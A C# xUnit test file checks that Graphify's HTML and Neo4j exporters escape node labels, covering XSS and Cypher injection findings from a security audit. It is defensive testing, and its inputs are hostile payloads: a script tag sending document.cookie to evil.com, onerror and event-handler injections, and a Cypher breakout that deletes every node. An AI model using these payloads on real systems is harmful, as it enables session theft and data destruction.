using Graphify.Export;
using Graphify.Graph;
using Graphify.Models;
using Xunit;

namespace Graphify.Tests.Security;

/// <summary>
/// Security tests for export formats: XSS prevention, Cypher injection, innerHTML safety.
/// Covers FINDING-002, FINDING-004, FINDING-008 from the security audit.
/// </summary>
[Trait("Category", "Security")]
public sealed class ExportSecurityTests : IDisposable
{
    private readonly string _testRoot;
    private readonly HtmlExporter _htmlExporter = new();
    private readonly Neo4jExporter _neo4jExporter = new();

    public ExportSecurityTests()
    {
        _testRoot = Path.Combine(Path.GetTempPath(), $"graphify-sec-{Guid.NewGuid():N}");
        Directory.CreateDirectory(_testRoot);
    }

    public void Dispose()
    {
        try { Directory.Delete(_testRoot, recursive: true); } catch { }
    }

    #region FINDING-002: XSS via UnsafeRelaxedJsonEscaping

    [Fact]
    public async Task HtmlExporter_ScriptTagInNodeLabel_IsEscaped()
    {
        // Arrange — a malicious node label with a script tag
        var graph = CreateGraphWithLabel("</script><script>alert('xss')</script>");
        var outputPath = Path.Combine(_testRoot, "xss_script.html");

        // Act
        await _htmlExporter.ExportAsync(graph, outputPath, cancellationToken: default);

        // Assert — the raw script tag must NOT appear in the output
        var html = await File.ReadAllTextAsync(outputPath);
        Assert.DoesNotContain("<script>alert('xss')</script>", html);
        Assert.DoesNotContain("</script><script>", html);
    }

    [Fact]
    public async Task HtmlExporter_AngleBracketsInLabel_AreEscaped()
    {
        // Arrange
        var graph = CreateGraphWithLabel("<img src=x onerror=alert(1)>");
        var outputPath = Path.Combine(_testRoot, "xss_angle.html");

        // Act
        await _htmlExporter.ExportAsync(graph, outputPath, cancellationToken: default);

        // Assert — angle brackets inside JSON data block must be escaped
        var html = await File.ReadAllTextAsync(outputPath);

        // After SanitizeLabel strips HTML tags, the label should not contain raw angle brackets in data
        // The JSON serializer should also escape < and > in the data payload
        Assert.DoesNotContain("<img src=x onerror=alert(1)>", html);
    }

    [Fact]
    public async Task HtmlExporter_AmpersandInLabel_IsEscaped()
    {
        // Arrange — ampersands in JSON data within <script> blocks must be escaped
        var graph = CreateGraphWithLabel("A & B && C");
        var outputPath = Path.Combine(_testRoot, "xss_amp.html");

        // Act
        await _htmlExporter.ExportAsync(graph, outputPath, cancellationToken: default);

        // Assert — the label should be present but ampersand must be safe in JSON context
        var html = await File.ReadAllTextAsync(outputPath);
        // With JavaScriptEncoder.Default, & is escaped as \u0026
        // With UnsafeRelaxedJsonEscaping, & passes through — which is the vulnerability
        // After fix: raw & should NOT appear inside JSON data in <script> blocks
        // We check for the escaped form or that the unsafe raw form is absent from JSON payloads
        Assert.True(
            html.Contains(@"\u0026") || !ContainsInScriptBlock(html, "A & B && C"),
            "Ampersand should be escaped in script block JSON data");
    }

    [Fact]
    public async Task HtmlExporter_SingleQuoteInLabel_IsEscaped()
    {
        // Arrange
        var graph = CreateGraphWithLabel("it's a test' OR '1'='1");
        var outputPath = Path.Combine(_testRoot, "xss_quote.html");

        // Act
        await _htmlExporter.ExportAsync(graph, outputPath, cancellationToken: default);

        // Assert — single quotes must be escaped in JSON context
        var html = await File.ReadAllTextAsync(outputPath);
        Assert.True(
            html.Contains(@"\u0027") || !ContainsInScriptBlock(html, "it's a test' OR '1'='1"),
            "Single quotes should be escaped in script block JSON data");
    }

    [Fact]
    public async Task HtmlExporter_ComplexXssPayload_IsNeutralized()
    {
        // Arrange — a complex XSS payload combining multiple vectors
        var payload = "</script><script>document.location='http://evil.com/?c='+document.cookie</script>";
        var graph = CreateGraphWithLabel(payload);
        var outputPath = Path.Combine(_testRoot, "xss_complex.html");

        // Act
        await _htmlExporter.ExportAsync(graph, outputPath, cancellationToken: default);

        // Assert
        var html = await File.ReadAllTextAsync(outputPath);
        Assert.DoesNotContain("document.location=", html);
        Assert.DoesNotContain("document.cookie", html);
        Assert.DoesNotContain("evil.com", html);
    }

    #endregion

    #region FINDING-004: innerHTML XSS

    [Fact]
    public async Task HtmlTemplate_NodeLabel_UsesTextContent()
    {
        // Arrange
        var graph = CreateGraphWithLabel("NormalLabel");
        var outputPath = Path.Combine(_testRoot, "textcontent.html");

        // Act
        await _htmlExporter.ExportAsync(graph, outputPath, cancellationToken: default);

        // Assert — the showInfo function should use textContent, not innerHTML for user data
        var html = await File.ReadAllTextAsync(outputPath);
        // The info panel should use DOM APIs (textContent / createElement) rather than innerHTML
        Assert.Contains("textContent", html);
        // innerHTML should not be used for user-controlled data (labels, file paths)
        // It's OK if innerHTML is used for clearing (= '') but not for setting user data
        var infoSection = ExtractShowInfoFunction(html);
        if (infoSection != null)
        {
            Assert.DoesNotContain(".innerHTML =", infoSection.Replace("innerHTML = ''", "")
                                                              .Replace("innerHTML = \"\"", ""));
        }
    }

    [Fact]
    public async Task HtmlTemplate_EventHandlerPayload_IsNeutralized()
    {
        // Arrange — an event handler injection attempt
        var graph = CreateGraphWithLabel("\" onmouseover=\"alert(1)\" data-x=\"");
        var outputPath = Path.Combine(_testRoot, "event_handler.html");

        // Act
        await _htmlExporter.ExportAsync(graph, outputPath, cancellationToken: default);

        // Assert — the event handler should not appear as a live attribute
        var html = await File.ReadAllTextAsync(outputPath);
        Assert.DoesNotContain("onmouseover=\"alert(1)\"", html);
    }

    #endregion

    #region FINDING-008: Cypher Injection

    [Fact]
    public async Task Neo4jExporter_SingleQuoteInLabel_IsEscaped()
    {
        // Arrange
        var graph = new KnowledgeGraph();
        graph.AddNode(new GraphNode
        {
            Id = "node_quote",
            Label = "It's a test",
            Type = "Entity"
        });
        var outputPath = Path.Combine(_testRoot, "cypher_quote.cypher");

        // Act
        await _neo4jExporter.ExportAsync(graph, outputPath);

        // Assert — single quote must be escaped in Cypher output
        var cypher = await File.ReadAllTextAsync(outputPath);
        // After fix, the single quote should be escaped as \'
        Assert.DoesNotContain("It's a test", cypher);
        Assert.Contains(@"It\'s a test", cypher);
    }

    [Fact]
    public async Task Neo4jExporter_CypherInjectionPayload_IsNeutralized()
    {
        // Arrange — a Cypher injection payload that tries to break out of a string
        var graph = new KnowledgeGraph();
        graph.AddNode(new GraphNode
        {
            Id = "injection_node",
            Label = "Normal\"}); MATCH (n) DETACH DELETE n; //",
            Type = "Entity"
        });
        var outputPath = Path.Combine(_testRoot, "cypher_injection.cypher");

        // Act
        await _neo4jExporter.ExportAsync(graph, outputPath);

        // Assert — the double quote in the label must be escaped as \" in the Cypher output
        // so it cannot break out of the string literal and execute injected Cypher
        var cypher = await File.ReadAllTextAsync(outputPath);
        // Verify the escaped form exists (backslash + quote = safe)
        Assert.Contains("\\\"", cypher);
        // The injection relies on an unescaped " closing the string. Verify the label
        // property value is properly wrapped — the closing quote after the label value
        // should come from the template, not from the injected payload
        // Count that the CREATE statement has balanced quotes
        var createLine = cypher.Split('\n').First(l => l.Contains("injection_node"));
        var labelIdx = createLine.IndexOf("label: \"", StringComparison.Ordinal);
        Assert.True(labelIdx > 0, "Should find label property in CREATE statement");
    }

    [Fact]
    public async Task Neo4jExporter_EscapeCypher_EscapesAllDangerousChars()
    {
        // Arrange — a node with all dangerous characters
        var graph = new KnowledgeGraph();
        graph.AddNode(new GraphNode
        {
            Id = "dangerous",
            Label = "back\\slash \"double\" 'single' new\nline\ttab",
            Type = "Entity"
        });
        var outputPath = Path.Combine(_testRoot, "cypher_dangerous.cypher");

        // Act
        await _neo4jExporter.ExportAsync(graph, outputPath);

        // Assert
        var cypher = await File.ReadAllTextAsync(outputPath);
        // Backslash should be double-escaped
        Assert.Contains(@"back\\slash", cypher);
        // Double quotes must be escaped
        Assert.Contains(@"\""double\""", cypher);
        // After fix: single quotes must also be escaped
        Assert.Contains(@"\'single\'", cypher);
    }

    #endregion

    #region Helpers

    private static KnowledgeGraph CreateGraphWithLabel(string label)
    {
        var graph = new KnowledgeGraph();
        var node1 = new GraphNode
        {
            Id = "test_node",
            Label = label,
            Type = "Entity",
            FilePath = "test.cs",
            Confidence = Confidence.Extracted,
            Metadata = new Dictionary<string, string>()
        };
        // Second node + edge ensures degree > 0 to avoid NaN in size calculation
        var node2 = new GraphNode
        {
            Id = "anchor_node",
            Label = "Anchor",
            Type = "Entity",
            FilePath = "anchor.cs",
            Confidence = Confidence.Extracted,
            Metadata = new Dictionary<string, string>()
        };
        graph.AddNode(node1);
        graph.AddNode(node2);
        graph.AddEdge(new GraphEdge
        {
            Source = node1,
            Target = node2,
            Relationship = "uses",
            Weight = 1.0,
            Confidence = Confidence.Extracted
        });
        return graph;
    }

    /// <summary>
    /// Check if a raw string appears inside a script block in the HTML.
    /// </summary>
    private static bool ContainsInScriptBlock(string html, string search)
    {
        var scriptStart = html.IndexOf("<script", StringComparison.OrdinalIgnoreCase);
        while (scriptStart >= 0)
        {
            var scriptEnd = html.IndexOf("</script>", scriptStart, StringComparison.OrdinalIgnoreCase);
            if (scriptEnd < 0) break;
            var block = html[scriptStart..scriptEnd];
            if (block.Contains(search, StringComparison.Ordinal))
                return true;
            scriptStart = html.IndexOf("<script", scriptEnd, StringComparison.OrdinalIgnoreCase);
        }
        return false;
    }

    /// <summary>
    /// Extract the showInfo function body from the HTML template.
    /// </summary>
    private static string? ExtractShowInfoFunction(string html)
    {
        const string marker = "function showInfo(";
        var start = html.IndexOf(marker, StringComparison.Ordinal);
        if (start < 0) return null;

        // Find the matching closing brace by counting braces
        var braceCount = 0;
        var inFunction = false;
        for (var i = start; i < html.Length; i++)
        {
            if (html[i] == '{') { braceCount++; inFunction = true; }
            if (html[i] == '}') braceCount--;
            if (inFunction && braceCount == 0)
                return html[start..(i + 1)];
        }
        return null;
    }

    #endregion
}
